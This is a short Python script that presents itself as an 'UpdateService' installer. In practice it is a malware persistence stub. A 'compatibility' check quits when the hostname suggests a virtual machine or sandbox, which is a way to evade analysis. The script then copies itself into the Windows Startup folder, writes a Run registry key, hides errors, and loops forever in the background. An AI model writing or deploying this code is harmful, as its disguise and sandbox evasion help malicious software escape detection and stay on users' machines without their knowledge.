import os
import platform
import shutil
import winreg

class ServiceInstaller:
    def __init__(self):
        self.app_name = "UpdateService"
        self.current_path = os.path.abspath(__file__)
        
    def check_compatibility(self):
        hostname = platform.node().lower()
        incompatible = ['vm', 'sandbox', 'test', 'virtualbox']
        
        for term in incompatible:
            if term in hostname:
                return False
        return True
    
    def install_service(self):
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        dest = os.path.join(startup_folder, f'{self.app_name}.py')
        
        if not os.path.exists(dest):
            shutil.copy(self.current_path, dest)
        
        try:
            registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                registry_path,
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, self.app_name, 0, winreg.REG_SZ, self.current_path)
            winreg.CloseKey(key)
        except:
            pass
    
    def run(self):
        if self.check_compatibility():
            self.install_service()
            import time
            while True:
                time.sleep(600)

if __name__ == "__main__":
    installer = ServiceInstaller()
    installer.run()
